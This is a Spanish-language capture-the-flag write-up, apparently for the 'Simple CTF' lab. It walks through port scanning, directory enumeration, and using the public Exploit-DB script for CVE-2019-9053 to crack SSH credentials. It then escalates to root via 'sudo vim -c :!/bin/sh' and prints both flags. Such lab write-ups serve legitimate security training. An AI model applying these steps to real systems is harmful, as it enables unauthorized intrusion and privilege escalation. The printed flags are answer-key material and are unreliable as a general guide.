## Objetivo
## Pistas


```

┌──(kali㉿kali)-[~]
└─$ nmap -Pn -sV --min-rate 5000 10.10.67.130  -v -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-17 21:31 EDT
NSE: Loaded 46 scripts for scanning.
Initiating Parallel DNS resolution of 1 host. at 21:31
Completed Parallel DNS resolution of 1 host. at 21:31, 0.03s elapsed
Initiating Connect Scan at 21:31
Scanning 10.10.67.130 [65535 ports]
Discovered open port 21/tcp on 10.10.67.130
Discovered open port 80/tcp on 10.10.67.130
Discovered open port 2222/tcp on 10.10.67.130
Completed Connect Scan at 21:32, 36.47s elapsed (65535 total ports)
Initiating Service scan at 21:32
Scanning 3 services on 10.10.67.130
Completed Service scan at 21:32, 6.45s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.67.130.
Initiating NSE at 21:32
Completed NSE at 21:32, 0.97s elapsed
Initiating NSE at 21:32
Completed NSE at 21:32, 0.81s elapsed
Nmap scan report for 10.10.67.130
Host is up (0.20s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.96 seconds
                                                               
¿Cuántos servicios se ejecutan en el puerto 1000?
Hay dos puertos 
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))

¿Qué se está ejecutando en el puerto superior?
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu 
en este esta corriendo ssh

¿Cuál es el CVE que estás usando contra la aplicación?

usamos gobuster para ir directo a ver si hay directorios extra

─(kali㉿kali)-[~]
└─$ gobuster dir -u http://10.10.67.130:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.67.130:80
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/simple               (Status: 301) [Size: 313] [--> http://10.10.67.130/simple/]
/server-status        (Status: 403) [Size: 300]

vamos a /simple para ver que encontramos
http://10.10.67.130/simple/

Aquí podemos ver que se trata de una página predeterminada para algo llamado “CMS Made Simple” y si miramos en la esquina inferior podemos ver que es la versión 2.2.8.

"This site is powered by [CMS Made Simple](http://www.cmsmadesimple.org) version 2.2.8"

Veamos si hay algo en línea sobre esta versión en particular simplemente yendo a Google y buscando “CMS Made Simple 2.2.8 exploit”.

En nuestros resultados, vemos una página en Exploit-DB que coincide con nuestra búsqueda y hace referencia a un ataque de inyección SQL que utiliza CVE-2019–9053.

¿A qué tipo de vulnerabilidad es vulnerable la aplicación?

SQLi

¿Cuál es la contraseña?

usamos este exploit:
**_wget_** [**_https://www.exploit-db.com/download/46635_**](https://www.exploit-db.com/download/46635)

instalamos estos 
┌──(kali㉿kali)-[~/Documents/Seguridad de redes/simplectf]
└─$ sudo pip install termcolor
┌──(kali㉿kali)-[~/Documents/Seguridad de redes/simplectf]
└─$ sudo pip install requests  


Ahora si corremos el exploit que descargamos 


 python3 46635.py -u http://10.10.67.130/simple --crack -w /usr/share/wordlists/rockyou.txt

username mitch
password secret

Where can you login with the details obtained?
ssh

What's the user flag?

──(kali㉿kali)-[~/Documents/Seguridad de redes/simplectf]
└─$ ssh mitch@10.10.174.7 -p 2222  
The authenticity of host '[10.10.174.7]:2222 ([10.10.174.7]:2222)' can't be established.
ED25519 key fingerprint is SHA256:iq4f0XcnA5nnPNAufEqOpvTbO8dOJPcHGgmeABEdQ5g.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.174.7]:2222' (ED25519) to the list of known hosts.
mitch@10.10.174.7's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
$ id
uid=1001(mitch) gid=1001(mitch) groups=1001(mitch)
$ ls
user.txt
$ cat user.txt
G00d j0b, keep up!
$ 

¿Hay algún otro usuario en el directorio de inicio? ¿Cómo se llama?

$ pwd
/home/mitch
$ cd ..
$ ls
mitch  sunbath
$ 
What can you leverage to spawn a privileged shell?
vim

What's the root flag?

$ sudo vim -c ':!/bin/sh'

# id     
uid=0(root) gid=0(root) groups=0(root)
# 
# cd /root               
# ls
root.txt
# cat root.txt 
W3ll d0n3. You made it!
# 





```
## Solución
## Notas adicionales
## Referencias